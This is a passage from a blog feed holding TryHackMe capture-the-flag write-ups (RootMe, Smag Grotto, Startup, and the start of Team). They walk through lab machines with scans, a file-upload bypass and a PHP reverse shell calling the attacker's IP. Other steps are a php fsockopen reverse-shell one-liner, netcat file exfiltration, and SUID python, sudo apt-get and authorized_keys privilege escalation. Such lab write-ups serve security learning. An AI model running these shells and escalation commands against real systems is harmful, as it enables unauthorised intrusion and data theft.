/panel                (Status: 301) [Size: 312] [--&amp;gt; http://10.10.35.149/panel/]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Panel looks interesting, so let’s try uploading a README.md file (of this repo).&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/1xtAlAB.png&#34; alt=&#34;https://i.imgur.com/1xtAlAB.png&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Success! Let’s check the uploads page.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/XV6CLIc.png&#34; alt=&#34;https://i.imgur.com/XV6CLIc.png&#34;  /&gt;&lt;/p&gt;
&lt;h3 id=&#34;13-revshell-time&#34;&gt;1.3 Revshell Time&lt;/h3&gt;
&lt;p&gt;Time for a phpreverseshell. Go to pentestmonkey or revshells.com and get the php one.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = &amp;quot;1.0&amp;quot;;
$ip = &#39;10.8.150.214&#39;;
$port = 1337;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = &#39;uname -a; w; id; sh -i&#39;;
$daemon = 0;
$debug = 0;
...
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Okay, time for uploading! &amp;hellip; and we get&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://s3-us-west-2.amazonaws.com/secure.notion-static.com/b1a725c9-6fa3-471a-890e-ed702dc32876/Untitled.png&#34; alt=&#34;A screenshot of rejected message from the uploads page&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Clearly the extension is working against us, since &lt;code&gt;.md&lt;/code&gt; passed.&lt;/p&gt;
&lt;p&gt;So let&amp;rsquo;s see what other extensions are allowed. &lt;a class=&#34;link&#34; href=&#34;https://www.guru99.com/what-is-php-first-php-program.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Source&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;.phtml&lt;/li&gt;
&lt;li&gt;.php3&lt;/li&gt;
&lt;li&gt;.php4&lt;/li&gt;
&lt;li&gt;.php5&lt;/li&gt;
&lt;li&gt;.phps&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Okay. One by one.&lt;/p&gt;
&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;&lt;img src=&#34;https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d4cc0a26-2daa-4b74-82bc-afc81ac4bed0/Untitled.png&#34; alt=&#34;https://s3-us-west-2.amazonaws.com/secure.notion-static.com/d4cc0a26-2daa-4b74-82bc-afc81ac4bed0/Untitled.png&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;Ha! &lt;code&gt;.phtml&lt;/code&gt; works! Lesgooo&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ nc -lvnp 1337      
listening on [any] 1337 ...
connect to [10.8.150.214] from (UNKNOWN) [10.10.35.149] 33678
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 05:39:36 up 30 min,  0 users,  load average: 0.00, 0.01, 0.18
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
sh: 0: can&#39;t access tty; job control turned off
$ whoami
www-data
$ pwd
/                                                                                 
$ ls                                                                              
bin                                                                               
boot                                                                              
cdrom                                                                             
dev
... 
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;www-data@rootme:/home/rootme$ find / -type f -perm -u=s 2&amp;gt;/dev/null
find / -type f -perm -u=s 2&amp;gt;/dev/null                                                                                                                                   
/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                             
/usr/lib/snapd/snap-confine                                                                                                                                             
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/newgidmap
/usr/bin/chsh
/usr/bin/python
/usr/bin/at
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/pkexec
/snap/core/8268/bin/mount
...
/snap/core/9665/usr/sbin/pppd
/bin/mount
/bin/su
/bin/fusermount
/bin/ping
/bin/umount
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;python thing looks interesting. &lt;a class=&#34;link&#34; href=&#34;https://gtfobins.github.io/gtfobins/python/#suid&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;gtfobins&lt;/a&gt; ftw!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@rootme:/$ /usr/bin/python -c &#39;import os; os.execl(&amp;quot;/bin/sh&amp;quot;, &amp;quot;sh&amp;quot;, &amp;quot;-p&amp;quot;)&#39;
&amp;lt;hon -c &#39;import os; os.execl(&amp;quot;/bin/sh&amp;quot;, &amp;quot;sh&amp;quot;, &amp;quot;-p&amp;quot;)&#39;
whoami
root
bash -i
bash: cannot set terminal process group (891): Inappropriate ioctl for device
bash: no job control in this shell
bash-4.4$
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We are done!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Smag Grotto Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-smag-grotto-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-smag-grotto-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/C5DIAQd.png" alt="Featured image of post TryHackMe: Smag Grotto Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/room_name_here&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-scanning--enumeration&#34;&gt;1. Scanning &amp;amp; Enumeration&lt;/h2&gt;
&lt;p&gt;We do the below scans in parallel.&lt;/p&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1. Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Smag
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Nothing too special.&lt;/p&gt;
&lt;h3 id=&#34;12-web-enumeration&#34;&gt;1.2. Web Enumeration&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuste-list-2.3-medium.txt -x &#39;php,html,txt&#39; -t 32 -q -219
/index.php            (Status: 200) [Size: 402]
/mail                 (Status: 301) [Size: 311] [10.10.62.219/mail/]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;/mail/&lt;/code&gt; looks interesting. We explore that below.&lt;/p&gt;
&lt;h3 id=&#34;13-web-exploration&#34;&gt;1.3. Web Exploration&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/teZV7zS.png&#34; alt=&#34;homepage of smag grotto&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/dAFRcPS.png&#34; alt=&#34;the mail directory in the website&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;We add the &lt;code&gt;smag.thm&lt;/code&gt; line in &lt;code&gt;/etc/hosts&lt;/code&gt; file, looking at their emails.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.62.219    smag.thm
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;14-wireshark&#34;&gt;1.4. Wireshark&lt;/h3&gt;
&lt;p&gt;The website has a file, which we can download just by clicking on it. Exploring it further.&lt;/p&gt;
&lt;p&gt;In one of the packets, we found:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /login.php HTTP/1.1
Host: development.smag.thm
User-Agent: curl/7.47.0
Accept: */*
Content-Length: 39
Content-Type: application/x-www-form-urlencoded

username={hidden}&amp;amp;password={wow_very_nice}HTTP/1.1 200 OK
Date: Wed, 03 Jun 2020 18:04:07 GMT
Server: Apache/2.4.18 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Add the &lt;code&gt;development.smag.thm&lt;/code&gt; along with &lt;code&gt;smag.thm&lt;/code&gt; domain in the &lt;code&gt;/etc/hosts&lt;/code&gt; file. It thus looks like the following.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.62.219    smag.thm development.smag.thm
# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;p&gt;Logging in using the credentials from wireshark, we get a place to enter commands.
&lt;img src=&#34;https://i.imgur.com/nqqDVou.png&#34; alt=&#34;admin panel on the subdomain and logged in using creds&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;I tried a bunch of commands, and this one stuck: &lt;code&gt;php -r &#39;$sock=fsockopen(&amp;quot;MY_KALI_IP&amp;quot;,4444);exec(&amp;quot;sh &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&#39;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;We get a shell!&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ nc -lvnp 4444                  
listening on [any] 4444 ...
connect to [10.17.8.184] from (UNKNOWN) [10.10.62.219] 33886
bash -i
bash: cannot set terminal process group (707): Inappropriate ioctl for device
bash: no job control in this shell
www-data@smag:/var/www/development.smag.thm$ 
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
&lt;p&gt;Looking around, I found something intersting in &lt;code&gt;/etc/crontab&lt;/code&gt; in the last line.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@smag:/$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don&#39;t have to run the `crontab&#39;
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.monthly )
*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup &amp;gt; /home/jake/.ssh/authorized_keys
#
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We see the file &lt;code&gt;/opt/.backups/jake_id_rsa.pub.backup&lt;/code&gt; is put into jake&amp;rsquo;s authorized keys. This means that if I can get my own, kali SSH public key in here, I would be able to login without a password.&lt;/p&gt;
&lt;p&gt;First, we need to make sure we have writing permissions.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@smag:/$ ls -la /opt/.backups/jake_id_rsa.pub.backup
ls -la /opt/.backups/jake_id_rsa.pub.backup
-rw-rw-rw- 1 root root 563 Jun  5  2020 /opt/.backups/jake_id_rsa.pub.backup
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Great! Now I copy pasted my own &lt;code&gt;id_rsa.pub&lt;/code&gt; key here.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@smag:/$ echo &amp;quot;ssh-rsa {wow_nice_looking_key_uh} kali@kali&amp;quot; &amp;gt; /opt/.backups/jake_id_rsa.pub.backup
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And &amp;hellip;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ ssh jake@10.10.62.219      
The authenticity of host &#39;10.10.62.219 (10.10.62.219)&#39; can&#39;t be established.
ECDSA key fingerprint is SHA256:MMv7NKmeLS/aEUSOLy0NbyGrLCEKErHJTp1cIvsxnpA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added &#39;10.10.62.219&#39; (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

Last login: Fri Jun  5 10:15:15 2020
jake@smag:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Success!&lt;/p&gt;
&lt;p&gt;Now for PrivEsc to root. Exploring a bit, I found:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;jake@smag:~$ sudo -l
Matching Defaults entries for jake on smag:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on smag:
    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Using &lt;a class=&#34;link&#34; href=&#34;https://gtfobins.github.io/gtfobins/apt-get/#sudo&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;GTFOBins - apt-get sudo exploit&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
# whoami 
root
# 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;System compromised!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Startup Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-startup-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-startup-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/xPZaCyo.png" alt="Featured image of post TryHackMe: Startup Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/startup&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-enumeration--scanning&#34;&gt;1. Enumeration &amp;amp; Scanning&lt;/h2&gt;
&lt;h3 id=&#34;11-port-scanning&#34;&gt;1.1 Port Scanning&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ nmap -sC -sV -A 10.10.109.61
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-18 06:31 EDT
Nmap scan report for 10.10.109.61
Host is up (0.24s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp [NSE: writeable]
| -rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
|_-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.8.150.214
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b9:a6:0b:84:1d:22:01:a4:01:30:48:43:61:2b:ab:94 (RSA)
|   256 ec:13:25:8c:18:20:36:e6:ce:91:0e:16:26:eb:a2:be (ECDSA)
|_  256 a2:ff:2a:72:81:aa:a2:9f:55:a4:dc:92:23:e6:b4:3f (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Maintenance
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.09 seconds
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Anonymous login allowed &amp;hellip; why?&lt;/p&gt;
&lt;h3 id=&#34;12-ftp&#34;&gt;1.2 FTP&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ ftp 10.10.109.61  
Connected to 10.10.109.61.
220 (vsFTPd 3.0.3)
Name (10.10.109.61:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 ftp
-rw-r--r--    1 0        0          251631 Nov 12  2020 important.jpg
-rw-r--r--    1 0        0             208 Nov 12  2020 notice.txt
226 Directory send OK.
ftp&amp;gt; get notice.txt
...
ftp&amp;gt; get important.jpg
...
ftp&amp;gt; cd ftp
...
ftp&amp;gt; ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxrwxrwx    2 65534    65534        4096 Nov 12  2020 .
drwxr-xr-x    3 65534    65534        4096 Nov 12  2020 ..
226 Directory send OK. 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The &lt;code&gt;ftp&lt;/code&gt; directory was empty. Let&amp;rsquo;s look at the other two files.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ cat notice.txt 
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY. People downloading documents from our website will think we are a joke! Now I dont know who it is, but Maya is looking pretty sus.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/UEd15ea.png&#34; alt=&#34;The important.jpg image, which is an AmongUs meme&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;One interesting thing to note is that the &lt;code&gt;ftp&lt;/code&gt; directory is also writable.&lt;/p&gt;
&lt;h3 id=&#34;13-web-enumeration--exploration&#34;&gt;1.3 Web Enumeration &amp;amp; Exploration&lt;/h3&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/xPZaCyo.png&#34; alt=&#34;A screenshot of the website&amp;amp;rsquo;s intial page&#34;  /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ gobuster dir -a R -u 10.10.109.61 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q
/files                (Status: 301) [Size: 312] [--&amp;gt; http://10.10.109.61/files/]
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Going to the web page, we see that all of these files are hosted, which were present in ftp port. This includes the image and the notice. Recall that &lt;code&gt;ftp&lt;/code&gt; is also writeable. Its very clear now that we have to upload a reverse shell.&lt;/p&gt;
&lt;h3 id=&#34;14-reverse-shell&#34;&gt;1.4 Reverse Shell&lt;/h3&gt;
&lt;p&gt;Now, the question is, of what? php? Well going to &lt;code&gt;http://10.10.109.61/index.php&lt;/code&gt; leads me to a &amp;ldquo;Not Found&amp;rdquo; page. Uh &amp;hellip; perl or something?&lt;/p&gt;
&lt;p&gt;Let&amp;rsquo;s try php rev shell anyways. Use &lt;a class=&#34;link&#34; href=&#34;https://www.revshells.com/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;revshells&lt;/a&gt; and get one for yourself. &lt;code&gt;put&lt;/code&gt; the file in &lt;code&gt;/ftp&lt;/code&gt; folder. Start netcat on your specified port and ip.&lt;/p&gt;
&lt;h2 id=&#34;2-foothold&#34;&gt;2. Foothold&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1337      
listening on [any] 1337 ...
connect to [10.8.150.214] from (UNKNOWN) [10.10.109.61] 52074
Linux startup 4.4.0-190-generic #220-Ubuntu SMP Fri Aug 28 23:02:15 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 10:53:18 up 24 min,  0 users,  load average: 0.00, 0.00, 0.06
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (1233): Inappropriate ioctl for device
bash: no job control in this shell
www-data@startup:/$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we are in!&lt;/p&gt;
&lt;p&gt;I tried &lt;code&gt;cd&lt;/code&gt;-ing into the user, but to no avail. The ssh keys are also in palce. What to do? Hint says to look for something sus.&lt;/p&gt;
&lt;h3 id=&#34;21-exploration&#34;&gt;2.1 Exploration&lt;/h3&gt;
&lt;p&gt;We find a folder named incidents. It has a single pcapng file, suspicious.pcapng. I checked if the machine has netcat, and it does. So, let&amp;rsquo;s transfer the file and go in detail.&lt;/p&gt;
&lt;p&gt;On attacked machine:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;www-data@startup:/incidents$ nc 10.8.150.214 1337 &amp;lt; suspicious.pcapng   
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;On your machine:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ nc -lvnp 1337 &amp;gt; sus.pcapng  
listening on [any] 1337 ...
connect to [10.8.150.214] from (UNKNOWN) [10.10.109.61] 52080
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looking around in the file, we have the passowrd hidden somewhere. Try finding it XD&lt;/p&gt;
&lt;h3 id=&#34;22-ssh&#34;&gt;2.2 SSH&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[~]
└─$ ssh lennie@10.10.109.61
...
$ bash -i
lennie@startup:~$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And we are in (stably) :D&lt;/p&gt;
&lt;h2 id=&#34;3-privesc&#34;&gt;3. PrivEsc&lt;/h2&gt;
&lt;p&gt;I tried &lt;code&gt;lennie@startup:/$ file / -type f -perm -u=s 2&amp;gt;/dev/null&lt;/code&gt;, which have empty results.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;sudo -l&lt;/code&gt; command does not work either.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;lennie@startup:/$ sudo -l
sudo: unable to resolve host startup
[sudo] password for lennie: 
Sorry, user lennie may not run sudo on startup.
lennie@startup:/$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;I checked the crontab, also not very interesting&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;lennie@startup:~/scripts$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don&#39;t have to run the `crontab&#39;
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;amp;&amp;amp; run-parts --report /etc/cron.monthly )
#
lennie@startup:~/scripts$ 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Looking at the &lt;code&gt;/scripts/&lt;/code&gt; folder, we have some scripts lying around. I tried running the planner, and it printed out &amp;ldquo;done&amp;rdquo;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;lennie@startup:~/scripts$ cat planner.sh 
#!/bin/bash
echo $LIST &amp;gt; /home/lennie/scripts/startup_list.txt
/etc/print.sh
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The startup_list is empty. Moreover running the script again shows &lt;code&gt;planner.sh: line 2: /home/lennie/scripts/startup_list.txt: Permission denied&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This means we have two options. Make some use of &lt;code&gt;$LIST&lt;/code&gt; or explore &lt;code&gt;/etc/print.sh&lt;/code&gt;. Since we don&amp;rsquo;t have permissions,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;lennie@startup:~/scripts$ ls -la
total 16
drwxr-xr-x 2 root   root   4096 Nov 12  2020 .
drwx------ 5 lennie lennie 4096 May 18 11:33 ..
-rwxr-xr-x 1 root   root     77 Nov 12  2020 planner.sh
-rw-r--r-- 1 root   root      1 May 18 11:34 startup_list.txt
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;let&amp;rsquo;s first look at &lt;code&gt;/etc/print.sh&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;lennie@startup:~/scripts$ cat /etc/print.sh
#!/bin/bash
echo &amp;quot;Done!&amp;quot;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We have permissions to edit this file,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;lennie@startup:~/scripts$ ls -la /etc/print.sh
-rwx------ 1 lennie lennie 25 May 18 11:33 /etc/print.sh
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This means that we can put a reverse shell in here &amp;hellip; and hope for the best.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;┌──(kali㉿kali)-[/tmp]
└─$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.8.150.214] from (UNKNOWN) [10.10.109.61] 52098
bash: cannot set terminal process group (2291): Inappropriate ioctl for device
bash: no job control in this shell
root@startup:~# 
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;And &amp;hellip; we have root!&lt;/p&gt;
</description>
        </item>
        <item>
        <title>TryHackMe: Team Final Writeup</title>
        <link>https://chaudhary1337.github.io/p/tryhackme-team-final-writeup/</link>
        <pubDate>Tue, 15 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://chaudhary1337.github.io/p/tryhackme-team-final-writeup/</guid>
        <description>&lt;img src="https://i.imgur.com/OT9fQyi.png" alt="Featured image of post TryHackMe: Team Final Writeup" /&gt;&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://tryhackme.com/room/teamcw&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Play&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;1-enumeration-and-scanning&#34;&gt;1. Enumeration and Scanning&lt;/h2&gt;
&lt;p&gt;As usual, we start off with &lt;code&gt;nmap&lt;/code&gt; and &lt;code&gt;gobuster&lt;/code&gt; scans.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;❯ nmap -sC -sV -A 10.10.82.31&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;❯ gobuster dir -u 10.10.82.31 -w &amp;quot;/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt&amp;quot; -x &amp;quot;html,php,txt&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;While they run, let&amp;rsquo;s check out the webpage itself. Looks like the default page.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://i.imgur.com/YFJ7Hhw.png&#34; alt=&#34;&#34;  /&gt;&lt;/p&gt;
&lt;p&gt;We see two things: that bug and the &lt;code&gt;team.thm&lt;/code&gt; thing. The bug link is nothing special. Let&amp;rsquo;s add &lt;code&gt;team.thm&lt;/code&gt; to our host list.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;❯ sudo vim /etc/hosts
❯ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.82.31     team.thm
